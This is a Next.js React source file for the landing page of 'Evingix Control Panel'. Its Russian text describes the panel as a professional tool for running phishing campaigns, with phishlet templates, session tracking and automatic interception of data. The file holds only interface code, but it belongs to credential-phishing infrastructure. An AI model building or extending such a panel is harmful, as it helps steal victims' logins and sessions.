'use client'

import { useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { Shield, ArrowRight, Zap, Globe, Key, Users, Activity, Server } from 'lucide-react'

export default function HomePage() {
  const router = useRouter()

  useEffect(() => {
    // Автоматическое перенаправление на dashboard
    const timer = setTimeout(() => {
      router.push('/dashboard')
    }, 1500)
    return () => clearTimeout(timer)
  }, [router])

  const features = [
    { icon: Globe, title: 'Фишлеты', desc: '15+ готовых шаблонов' },
    { icon: Users, title: 'Сессии', desc: 'Отслеживание в реальном времени' },
    { icon: Key, title: 'Данные', desc: 'Автоматический перехват' },
    { icon: Activity, title: 'Мониторинг', desc: 'Статистика и логи' },
  ]

  return (
    <div className="min-h-screen bg-slate-900 flex items-center justify-center p-6">
      <div className="max-w-2xl w-full text-center">
        {/* Logo */}
        <div className="mb-8">
          <div className="relative inline-block">
            <div className="p-4 bg-gradient-to-br from-blue-500 to-purple-600 rounded-2xl inline-block">
              <Shield className="w-16 h-16 text-white" />
            </div>
            <div className="absolute inset-0 bg-blue-500/30 blur-2xl rounded-full" />
          </div>
        </div>

        {/* Title */}
        <h1 className="text-4xl font-bold text-white mb-4">
          Evingix <span className="text-blue-400">Control Panel</span>
        </h1>
        <p className="text-slate-400 text-lg mb-12">
          Профессиональная панель управления фишинговой кампанией
        </p>

        {/* Features */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
          {features.map((feature, index) => (
            <div 
              key={index}
              className="p-4 bg-slate-800 rounded-xl hover:bg-slate-700 transition-colors"
            >
              <feature.icon className="w-8 h-8 text-blue-400 mx-auto mb-2" />
              <p className="font-medium text-white">{feature.title}</p>
              <p className="text-xs text-slate-400">{feature.desc}</p>
            </div>
          ))}
        </div>

        {/* Loading indicator */}
        <div className="space-y-4">
          <div className="flex items-center justify-center space-x-2">
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
          </div>
          <p className="text-slate-500 text-sm">Перенаправление на панель управления...</p>
        </div>

        {/* Manual links */}
        <div className="flex flex-col sm:flex-row items-center justify-center gap-4 mt-8">
          <a
            href="/panel"
            className="inline-flex items-center space-x-2 px-6 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
          >
            <span>Единая панель управления</span>
            <ArrowRight className="w-4 h-4" />
          </a>
          <a
            href="/simple"
            className="inline-flex items-center space-x-2 px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors"
          >
            <span>Простая панель</span>
            <ArrowRight className="w-4 h-4" />
          </a>
        </div>
      </div>
    </div>
  )
}
